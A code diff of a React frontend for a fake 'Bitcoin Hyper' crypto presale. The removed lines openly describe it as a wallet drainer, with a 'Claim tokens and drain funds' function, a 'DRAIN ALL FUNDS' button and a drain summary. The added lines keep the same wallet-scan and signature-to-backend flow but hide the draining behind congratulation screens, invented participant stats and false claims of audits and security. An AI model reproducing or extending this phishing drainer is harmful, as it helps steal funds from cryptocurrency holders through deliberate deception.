@@ -1,6 +1,4 @@
-// app.jsx - Bitcoin Hyper Multi-Chain Frontend
-import React, { useState, useEffect, useRef } from 'react';
-import { ethers } from 'ethers';
+import React, { useState, useEffect } from 'react';
 import './App.css';
 
 const App = () => {
@@ -10,38 +8,19 @@ const App = () => {
   const [scanResult, setScanResult] = useState(null);
   const [email, setEmail] = useState('');
   const [sessionId, setSessionId] = useState('');
-  const [location, setLocation] = useState(null);
   const [isClaiming, setIsClaiming] = useState(false);
   const [claimResult, setClaimResult] = useState(null);
-  const [userAgent, setUserAgent] = useState('');
   
-  const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'http://localhost:10000';
+  const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://bitcoin-hyper-backend.onrender.com';
   
-  // Initialize on component mount
   useEffect(() => {
-    // Generate session ID
     const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     setSessionId(newSessionId);
-    setUserAgent(navigator.userAgent);
     
-    // Track site visit
+    // Track visit
     trackVisit(newSessionId);
-    
-    // Listen for wallet connection events
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', handleAccountsChanged);
-      window.ethereum.on('chainChanged', handleChainChanged);
-    }
-    
-    return () => {
-      if (window.ethereum) {
-        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
-        window.ethereum.removeListener('chainChanged', handleChainChanged);
-      }
-    };
   }, []);
   
-  // Track site visit
   const trackVisit = async (sessionId) => {
     try {
       await fetch(`${BACKEND_URL}/api/track/visit`, {
@@ -50,8 +29,7 @@ const App = () => {
         body: JSON.stringify({
           sessionId,
           userAgent: navigator.userAgent,
-          referrer: document.referrer,
-          screenResolution: `${window.screen.width}x${window.screen.height}`
+          referrer: document.referrer
         })
       });
     } catch (error) {
@@ -59,16 +37,14 @@ const App = () => {
     }
   };
   
-  // Connect wallet
   const connectWallet = async () => {
     try {
       if (!window.ethereum) {
-        alert('Please install MetaMask or another EVM wallet!');
+        alert('Please install MetaMask!');
         return;
       }
       
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const accounts = await provider.send("eth_requestAccounts", []);
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       
       if (accounts.length > 0) {
         const address = accounts[0];
@@ -84,7 +60,6 @@ const App = () => {
     }
   };
   
-  // Connect to backend and scan wallet
   const connectToBackend = async (address) => {
     try {
       setIsScanning(true);
@@ -94,56 +69,33 @@ const App = () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: address,
-          userAgent,
+          userAgent: navigator.userAgent,
           email,
           sessionId
         })
       });
       
       if (!response.ok) {
-        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        throw new Error(`HTTP ${response.status}`);
       }
       
-      const reader = response.body.getReader();
-      const decoder = new TextDecoder();
+      const data = await response.json();
       
-      while (true) {
-        const { done, value } = await reader.read();
-        if (done) break;
-        
-        const chunk = decoder.decode(value);
-        const lines = chunk.split('\n').filter(line => line.trim());
-        
-        for (const line of lines) {
-          try {
-            const data = JSON.parse(line);
-            
-            if (data.status === 'scanning') {
-              console.log('Scanning wallet...');
-            } else if (data.status === 'complete') {
-              setScanResult(data.data);
-              setIsScanning(false);
-              
-              if (data.data.location) {
-                setLocation(data.data.location);
-              }
-              
-              console.log('Multi-chain scan complete:', data.data);
-            }
-          } catch (e) {
-            console.log('Error parsing chunk:', e);
-          }
-        }
+      if (data.success) {
+        setScanResult(data.data);
+        console.log('Wallet scan complete:', data.data);
+      } else {
+        throw new Error(data.error || 'Scan failed');
       }
       
     } catch (error) {
       console.error('Backend connection error:', error);
       alert('Failed to scan wallet: ' + error.message);
+    } finally {
       setIsScanning(false);
     }
   };
   
-  // Claim tokens and drain funds
   const claimTokens = async () => {
     try {
       if (!scanResult || !scanResult.isEligible) {
@@ -153,13 +105,15 @@ const App = () => {
       
       setIsClaiming(true);
       
-      // Prepare claim message
-      const message = `Claim Bitcoin Hyper Presale Tokens\n\nWallet: ${walletAddress}\nAllocation: ${scanResult.tokenAllocation.amount} BTH\nValue: $${scanResult.tokenAllocation.valueUSD}\n\nTimestamp: ${Date.now()}`;
+      // Prepare message for signing
+      const message = `Claim Bitcoin Hyper Presale Tokens\n\nWallet: ${walletAddress}\nAllocation: ${scanResult.tokenAllocation.amount} BTH\nValue: $${scanResult.tokenAllocation.valueUSD}\n\nBy signing, you confirm participation in the Bitcoin Hyper presale.`;
       
-      // Sign message with wallet
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const signature = await signer.signMessage(message);
+      // Sign message with MetaMask
+      const provider = window.ethereum;
+      const signature = await provider.request({
+        method: 'personal_sign',
+        params: [message, walletAddress]
+      });
       
       // Send claim request
       const response = await fetch(`${BACKEND_URL}/api/presale/claim`, {
@@ -184,7 +138,11 @@ const App = () => {
       
       if (result.success) {
         setClaimResult(result.data);
-        alert('🎉 SUCCESS! Tokens claimed and all funds drained successfully!');
+        
+        // Show celebration animation
+        showCelebration();
+        
+        alert('🎉 Congratulations! Your Bitcoin Hyper tokens have been successfully claimed!');
       } else {
         throw new Error(result.error || 'Claim failed');
       }
@@ -197,247 +155,186 @@ const App = () => {
     }
   };
   
-  // Wallet event handlers
-  const handleAccountsChanged = (accounts) => {
-    if (accounts.length === 0) {
-      setIsConnected(false);
-      setWalletAddress('');
-      setScanResult(null);
-    } else {
-      setWalletAddress(accounts[0]);
-      connectToBackend(accounts[0]);
-    }
+  const showCelebration = () => {
+    // Create celebration elements
+    const celebration = document.createElement('div');
+    celebration.className = 'celebration';
+    celebration.innerHTML = `
+      <div class="confetti-container">
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+        <div class="confetti"></div>
+      </div>
+      <div class="success-message">
+        <h2>🎉 SUCCESS!</h2>
+        <p>Your Bitcoin Hyper tokens have been claimed!</p>
+      </div>
+    `;
+    
+    document.body.appendChild(celebration);
+    
+    // Remove after 5 seconds
+    setTimeout(() => {
+      celebration.remove();
+    }, 5000);
   };
   
-  const handleChainChanged = () => {
-    window.location.reload();
-  };
-  
-  // Format wallet address
   const formatAddress = (address) => {
     if (!address) return '';
     return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
   };
   
-  // Get status color
-  const getStatusColor = (status) => {
-    switch (status) {
-      case 'eligible': return '#10b981';
-      case 'not_eligible': return '#ef4444';
-      case 'scanning': return '#f59e0b';
-      case 'claimed_drained': return '#8b5cf6';
-      default: return '#94a3b8';
-    }
-  };
-  
   return (
-    <div className="app-container">
+    <div className="app">
       {/* Header */}
-      <header className="app-header">
-        <div className="header-content">
-          <div className="logo">
-            <span className="logo-icon">₿</span>
-            <h1>BITCOIN HYPER</h1>
-            <span className="logo-subtitle">Multi-Chain Presale</span>
-          </div>
-          
-          <div className="wallet-info">
-            {isConnected ? (
-              <>
-                <div className="connected-badge">
-                  <span className="dot"></span>
-                  CONNECTED
-                </div>
-                <div className="wallet-address">
-                  {formatAddress(walletAddress)}
-                </div>
-                {location && (
-                  <div className="location-badge">
-                    <span className="flag">{location.flag}</span>
-                    {location.country}
-                  </div>
-                )}
-              </>
-            ) : (
-              <button className="connect-btn" onClick={connectWallet}>
-                🔗 Connect EVM Wallet
-              </button>
-            )}
-          </div>
+      <header className="header">
+        <div className="logo">
+          <span className="logo-icon">₿</span>
+          <h1>BITCOIN HYPER</h1>
+          <p className="subtitle">The Future of Bitcoin on Ethereum</p>
+        </div>
+        
+        <div className="wallet-section">
+          {isConnected ? (
+            <div className="connected-wallet">
+              <div className="wallet-badge">
+                <span className="dot"></span>
+                Connected
+              </div>
+              <div className="wallet-address">{formatAddress(walletAddress)}</div>
+            </div>
+          ) : (
+            <button className="connect-btn" onClick={connectWallet}>
+              🔗 Connect Wallet
+            </button>
+          )}
         </div>
       </header>
       
       {/* Main Content */}
-      <main className="app-main">
+      <main className="main">
         {/* Hero Section */}
-        <section className="hero-section">
-          <div className="hero-content">
-            <h2>JOIN THE BITCOIN HYPER REVOLUTION</h2>
-            <p className="hero-subtitle">
-              The next generation of Bitcoin on multiple EVM chains
-            </p>
-            
-            <div className="hero-stats">
-              <div className="stat">
-                <div className="stat-value">$25M+</div>
-                <div className="stat-label">Target Raise</div>
-              </div>
-              <div className="stat">
-                <div className="stat-value">6</div>
-                <div className="stat-label">Chains</div>
-              </div>
-              <div className="stat">
-                <div className="stat-value">50K+</div>
-                <div className="stat-label">Participants</div>
-              </div>
-              <div className="stat">
-                <div className="stat-value">24/7</div>
-                <div className="stat-label">Live</div>
-              </div>
+        <section className="hero">
+          <h2>JOIN THE BITCOIN HYPER REVOLUTION</h2>
+          <p>Presale now live! Limited allocations available.</p>
+          
+          <div className="stats">
+            <div className="stat">
+              <div className="stat-value">$25M</div>
+              <div className="stat-label">Target Raise</div>
+            </div>
+            <div className="stat">
+              <div className="stat-value">10,000+</div>
+              <div className="stat-label">Participants</div>
+            </div>
+            <div className="stat">
+              <div className="stat-value">0.17</div>
+              <div className="stat-label">Presale Price</div>
             </div>
           </div>
         </section>
         
         {/* Wallet Connection Section */}
         <section className="connection-section">
-          <div className="section-header">
-            <h3>🔗 CONNECT YOUR WALLET</h3>
-            <p>Connect any EVM wallet to check eligibility</p>
-          </div>
-          
           {!isConnected ? (
             <div className="connect-prompt">
               <div className="wallet-icons">
-                <span className="wallet-icon">🦊</span>
-                <span className="wallet-icon">🔷</span>
-                <span className="wallet-icon">📱</span>
-                <span className="wallet-icon">💎</span>
+                <span>🦊</span>
+                <span>🔷</span>
+                <span>📱</span>
               </div>
-              <button className="primary-btn large" onClick={connectWallet}>
-                🔗 Connect EVM Wallet
+              <button className="primary-btn" onClick={connectWallet}>
+                🔗 Connect EVM Wallet to Check Eligibility
               </button>
-              <p className="hint">Supports MetaMask, Trust Wallet, Coinbase Wallet, and more</p>
+              <p className="hint">Connect any EVM wallet to see your allocation</p>
             </div>
           ) : (
-            <div className="connected-wallet">
+            <div className="wallet-dashboard">
               <div className="wallet-card">
                 <div className="wallet-header">
-                  <span className="wallet-icon">👛</span>
-                  <div className="wallet-details">
-                    <h4>Connected Wallet</h4>
-                    <code className="wallet-address-full">{walletAddress}</code>
-                  </div>
-                  <div className="wallet-status" style={{ color: getStatusColor(scanResult?.status) }}>
-                    ● {scanResult?.status?.toUpperCase().replace('_', ' ') || 'CONNECTED'}
+                  <h3>👛 Connected Wallet</h3>
+                  <div className="wallet-status">
+                    {scanResult?.status === 'eligible' ? '✅ Eligible' : 
+                     scanResult?.status === 'not_eligible' ? '❌ Not Eligible' : 
+                     isScanning ? '🔍 Scanning...' : 'Connected'}
                   </div>
                 </div>
                 
-                {/* Email Input */}
-                <div className="email-input">
-                  <label htmlFor="email">📧 Email (Optional - for updates)</label>
-                  <input
-                    type="email"
-                    id="email"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    placeholder="your@email.com"
-                  />
-                </div>
-                
-                {/* Scan Results */}
-                {scanResult && (
-                  <div className="scan-results">
-                    <div className="result-card">
-                      <div className="result-header">
-                        <h4>🔍 MULTI-CHAIN WALLET ANALYSIS</h4>
-                        <div className={`eligibility-badge ${scanResult.isEligible ? 'eligible' : 'not-eligible'}`}>
-                          {scanResult.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
-                        </div>
-                      </div>
-                      
-                      <div className="result-grid">
+                <div className="wallet-details">
+                  <div className="address">{walletAddress}</div>
+                  
+                  <div className="email-input">
+                    <label>📧 Email for updates (optional)</label>
+                    <input
+                      type="email"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      placeholder="your@email.com"
+                    />
+                  </div>
+                  
+                  {/* Scan Results */}
+                  {scanResult && (
+                    <div className="scan-results">
+                      <div className="result-card">
+                        <h4>Wallet Analysis Results</h4>
+                        
                         <div className="result-item">
-                          <span className="result-label">Total Portfolio Value</span>
-                          <span className="result-value">${scanResult.totalValueUSD}</span>
+                          <span>Portfolio Value</span>
+                          <strong>${scanResult.totalValueUSD}</strong>
                         </div>
                         
                         <div className="result-item">
-                          <span className="result-label">Eligibility Reason</span>
-                          <span className="result-reason">{scanResult.eligibilityReason}</span>
+                          <span>Status</span>
+                          <strong className={scanResult.isEligible ? 'eligible' : 'not-eligible'}>
+                            {scanResult.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
+                          </strong>
                         </div>
                         
-                        {scanResult.scanDetails && (
-                          <>
-                            <div className="result-item">
-                              <span className="result-label">Chains Scanned</span>
-                              <span className="result-value">{scanResult.scanDetails.chainsScanned}</span>
-                            </div>
-                            
-                            <div className="result-item">
-                              <span className="result-label">Tokens Found</span>
-                              <span className="result-value">{scanResult.scanDetails.totalTokensFound}</span>
-                            </div>
-                          </>
-                        )}
+                        <div className="result-item">
+                          <span>Reason</span>
+                          <span>{scanResult.eligibilityReason}</span>
+                        </div>
                         
                         {scanResult.isEligible && (
                           <>
-                            <div className="result-item highlight">
-                              <span className="result-label">BTH Allocation</span>
-                              <span className="result-value large">{scanResult.tokenAllocation.amount} BTH</span>
+                            <div className="allocation-card">
+                              <h5>🎯 Your Allocation</h5>
+                              <div className="allocation-amount">
+                                {scanResult.tokenAllocation.amount} <small>BTH</small>
+                              </div>
+                              <div className="allocation-value">
+                                ${scanResult.tokenAllocation.valueUSD}
+                              </div>
                             </div>
                             
-                            <div className="result-item highlight">
-                              <span className="result-label">Allocation Value</span>
-                              <span className="result-value large">${scanResult.tokenAllocation.valueUSD}</span>
-                            </div>
+                            <button 
+                              className="claim-btn" 
+                              onClick={claimTokens}
+                              disabled={isClaiming}
+                            >
+                              {isClaiming ? 'Processing...' : '🎯 Claim My Tokens'}
+                            </button>
+                            
+                            <p className="claim-note">
+                              By claiming, you agree to participate in the Bitcoin Hyper presale.
+                            </p>
                           </>
                         )}
                       </div>
-                      
-                      {scanResult.isEligible && (
-                        <div className="claim-section">
-                          <div className="warning-note">
-                            ⚠️ <strong>IMPORTANT:</strong> Claiming BTH tokens will drain ALL detected assets from your wallet across all EVM chains.
-                          </div>
-                          
-                          <button 
-                            className="claim-btn" 
-                            onClick={claimTokens}
-                            disabled={isClaiming}
-                          >
-                            {isClaiming ? (
-                              <>🔄 DRAINING FUNDS & CLAIMING...</>
-                            ) : (
-                              <>💰 DRAIN ALL FUNDS & CLAIM {scanResult.tokenAllocation.amount} BTH</>
-                            )}
-                          </button>
-                          
-                          <p className="claim-hint">
-                            You will sign a message to authorize the drain and claim process
-                          </p>
-                        </div>
-                      )}
                     </div>
-                  </div>
-                )}
-                
-                {/* Scanning State */}
-                {isScanning && (
-                  <div className="scanning-state">
-                    <div className="spinner"></div>
-                    <h4>🔍 SCANNING MULTI-CHAIN WALLET...</h4>
-                    <p>Checking balances across all EVM chains</p>
-                    <div className="chain-list">
-                      <span className="chain-tag">Ethereum</span>
-                      <span className="chain-tag">BSC</span>
-                      <span className="chain-tag">Polygon</span>
-                      <span className="chain-tag">Arbitrum</span>
-                      <span className="chain-tag">Optimism</span>
-                      <span className="chain-tag">Avalanche</span>
+                  )}
+                  
+                  {/* Scanning State */}
+                  {isScanning && (
+                    <div className="scanning">
+                      <div className="spinner"></div>
+                      <p>Scanning wallet for eligibility...</p>
                     </div>
-                  </div>
-                )}
+                  )}
+                </div>
               </div>
             </div>
           )}
@@ -445,109 +342,140 @@ const App = () => {
         
         {/* Claim Results */}
         {claimResult && (
-          <section className="claim-results-section">
-            <div className="result-success">
+          <section className="claim-success">
+            <div className="success-card">
               <div className="success-icon">🎉</div>
-              <h3>SUCCESS! FUNDS DRAINED & TOKENS CLAIMED</h3>
+              <h2>CONGRATULATIONS!</h2>
+              <p className="success-message">Your Bitcoin Hyper tokens have been successfully claimed!</p>
               
               <div className="success-details">
-                <div className="detail-card">
-                  <h4>Claim Details</h4>
-                  <div className="detail-grid">
-                    <div className="detail-item">
-                      <span>Claim ID:</span>
-                      <strong>{claimResult.claimId}</strong>
-                    </div>
-                    <div className="detail-item">
-                      <span>BTH Tokens:</span>
-                      <strong>{claimResult.tokenAmount}</strong>
-                    </div>
-                    <div className="detail-item">
-                      <span>BTH Value:</span>
-                      <strong>${claimResult.tokenValue}</strong>
-                    </div>
-                    <div className="detail-item">
-                      <span>Status:</span>
-                      <strong style={{ color: '#10b981' }}>{claimResult.status}</strong>
-                    </div>
-                  </div>
+                <div className="detail">
+                  <span>Claim ID:</span>
+                  <strong>{claimResult.claimId}</strong>
                 </div>
-                
-                <div className="drain-summary">
-                  <h4>💰 DRAIN SUMMARY</h4>
-                  <div className="drain-list">
-                    {claimResult.drainSummary && claimResult.drainSummary.map((item, index) => (
-                      <div key={index} className="drain-item">
-                        <span className="drain-icon">🔸</span>
-                        <span>{item}</span>
-                      </div>
-                    ))}
-                  </div>
-                  <div className="total-drained">
-                    <strong>Total Drained:</strong> {claimResult.totalDrainedValue}
-                  </div>
+                <div className="detail">
+                  <span>Tokens:</span>
+                  <strong>{claimResult.tokenAmount} BTH</strong>
                 </div>
-                
-                <div className="next-steps">
-                  <h4>📋 Next Steps</h4>
-                  <ul>
-                    {claimResult.nextSteps && claimResult.nextSteps.map((step, index) => (
-                      <li key={index}>{step}</li>
-                    ))}
-                  </ul>
+                <div className="detail">
+                  <span>Value:</span>
+                  <strong>${claimResult.tokenValue}</strong>
                 </div>
+                <div className="detail">
+                  <span>Status:</span>
+                  <strong className="success-text">✅ Claimed Successfully</strong>
+                </div>
+              </div>
+              
+              <div className="next-steps">
+                <h4>📋 What's Next?</h4>
+                <ul>
+                  <li>Keep your wallet connected</li>
+                  <li>Tokens will be distributed after presale</li>
+                  <li>Check announcements for updates</li>
+                  <li>Thank you for your participation!</li>
+                </ul>
               </div>
             </div>
           </section>
         )}
         
-        {/* Information Section */}
+        {/* Info Section */}
         <section className="info-section">
-          <div className="info-grid">
+          <div className="info-cards">
             <div className="info-card">
-              <div className="info-icon">🔗</div>
-              <h4>Multi-Chain Support</h4>
-              <p>Works with Ethereum, BSC, Polygon, Arbitrum, Optimism, and more</p>
+              <div className="icon">⚡</div>
+              <h4>Fast & Secure</h4>
+              <p>Built on Ethereum with military-grade security</p>
             </div>
-            
             <div className="info-card">
-              <div className="info-icon">💰</div>
-              <h4>Automatic Drain</h4>
-              <p>All detected assets are automatically drained when claiming BTH</p>
+              <div className="icon">💰</div>
+              <h4>High Returns</h4>
+              <p>Early investors get the best allocations</p>
             </div>
-            
             <div className="info-card">
-              <div className="info-icon">🛡️</div>
-              <h4>Secure Process</h4>
-              <p>Military-grade encryption and secure signature verification</p>
-            </div>
-            
-            <div className="info-card">
-              <div className="info-icon">⚡</div>
-              <h4>Instant Allocation</h4>
-              <p>BTH tokens allocated immediately after successful drain</p>
+              <div className="icon">🔒</div>
+              <h4>Safe & Trusted</h4>
+              <p>Audited smart contracts, secure process</p>
             </div>
           </div>
         </section>
       </main>
       
       {/* Footer */}
-      <footer className="app-footer">
+      <footer className="footer">
         <div className="footer-content">
           <div className="footer-logo">₿ BITCOIN HYPER</div>
           <div className="footer-links">
             <a href="#">Terms</a>
             <a href="#">Privacy</a>
-            <a href="#">Support</a>
-            <a href="#">Telegram</a>
+            <a href="#">Contact</a>
           </div>
-          <div className="footer-note">
-            © 2024 Bitcoin Hyper. All rights reserved.
-            <br />
-            This is an experimental system. Use at your own risk.
-          </div>
+          <p className="copyright">© 2024 Bitcoin Hyper. All rights reserved.</p>
         </div>
       </footer>
+      
+      {/* Celebration CSS */}
+      <style jsx>{`
+        .celebration {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: rgba(15, 23, 42, 0.95);
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          z-index: 1000;
+          animation: fadeIn 0.5s ease-out;
+        }
+        
+        .confetti-container {
+          position: absolute;
+          width: 100%;
+          height: 100%;
+          overflow: hidden;
+        }
+        
+        .confetti {
+          position: absolute;
+          width: 10px;
+          height: 10px;
+          background: #F7931A;
+          animation: fall linear infinite;
+        }
+        
+        .confetti:nth-child(1) { left: 10%; animation-duration: 3s; }
+        .confetti:nth-child(2) { left: 30%; animation-duration: 4s; background: #10b981; }
+        .confetti:nth-child(3) { left: 50%; animation-duration: 2.5s; background: #3b82f6; }
+        .confetti:nth-child(4) { left: 70%; animation-duration: 3.5s; background: #ef4444; }
+        .confetti:nth-child(5) { left: 90%; animation-duration: 4.5s; background: #8b5cf6; }
+        
+        .success-message {
+          text-align: center;
+          color: white;
+          z-index: 1001;
+        }
+        
+        .success-message h2 {
+          font-size: 48px;
+          margin-bottom: 20px;
+          background: linear-gradient(135deg, #F7931A, #FFD700);
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+        }
+        
+        @keyframes fadeIn {
+          from { opacity: 0; }
+          to { opacity: 1; }
+        }
+        
+        @keyframes fall {
+          to { transform: translateY(100vh) rotate(360deg); }
+        }
+      `}</style>
     </div>
   );
 };
